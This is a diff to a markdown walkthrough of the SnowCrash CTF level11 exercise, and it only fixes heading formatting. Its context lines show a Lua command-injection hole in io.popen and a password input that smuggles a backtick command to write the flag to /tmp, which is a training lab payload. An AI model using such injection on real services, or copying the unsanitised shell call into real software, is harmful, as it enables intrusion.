@@ -49,7 +49,7 @@ level11@SnowCrash:~$ nc 127.0.0.1 5151
 Password:
 ```
 
-###3. Exploit with command injection
+### 3. Exploit with command injection
 The vulnerability is in line:
 ```bash
 prog = io.popen("echo "..pass.." | sha1sum", "r")
@@ -61,7 +61,7 @@ User input is directly concatenated into a shell command. Use backticks or $() t
 Password: `getflag` > /tmp/flag
 ```
 
-###4. Read the captured flag
+### 4. Read the captured flag
 
 ```bash
 level11@SnowCrash:~$ cat /tmp/flag
